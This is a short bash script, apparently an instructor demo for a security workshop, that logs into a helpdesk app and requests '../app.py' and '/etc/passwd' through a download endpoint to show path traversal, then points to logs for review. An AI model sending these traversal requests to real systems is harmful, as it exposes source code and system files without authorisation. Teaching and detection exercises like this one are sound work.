#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
DEMO_USER_AGENT="${DEMO_USER_AGENT:-InstructorTraversalDemo/1.0}"
source "$SCRIPT_DIR/demo-common.sh"
trap cleanup_demo_cookie EXIT

require_curl
login_to_helpdesk

demo_get "normal-download" "/download?file=welcome.txt"
demo_get "traversal-app" "/download?file=../app.py"
demo_get "traversal-passwd" "/download?file=/etc/passwd"

echo "Path traversal demo complete. Review the matching group logs, for example workshop-logs/group1/web/access.log and workshop-logs/group1/web/app.log, for /download entries from this source IP."
